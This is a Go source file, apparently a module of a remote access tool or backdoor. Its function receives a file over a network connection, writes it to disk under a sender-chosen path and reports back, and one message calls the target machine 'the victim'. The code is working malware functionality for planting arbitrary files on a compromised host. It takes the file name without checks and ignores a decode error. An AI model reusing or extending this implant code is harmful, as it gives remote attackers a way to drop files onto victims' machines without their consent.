package Download

import (
	"encoding/gob"
	"fmt"
	"net"
	"os"
)

type FileStruct struct {
	FileName string
	FileSize int
	FileContent []byte
}


func CheckExistence(fileName string)(bool){
	if _, err := os.Stat(fileName); err != nil{
		if os.IsNotExist(err){
			return false
		}
	}
	return true
}

func ReadFileContents(connection net.Conn)(err error){

	decoder := gob.NewDecoder(connection)

	fs := &FileStruct{}

	err = decoder.Decode(fs)

	file, err := os.Create(fs.FileName)
	if err != nil{
		fmt.Println("[+] Unable to create file")
	}

	defer file.Close()

	nbytes, err := file.Write(fs.FileContent)

	if err != nil{
		fmt.Println("[-] Unable to Write file")
	}else{
		fmt.Println("[+] Number of bytes Written ", nbytes)
	}

	var status string

	if CheckExistence(fs.FileName){
		status = "[+] Successfully written File"
	}else{
		status = "[-] Unable to write file to the victim"
	}

	connection.Write([]byte(status+ "\n"))







	return
}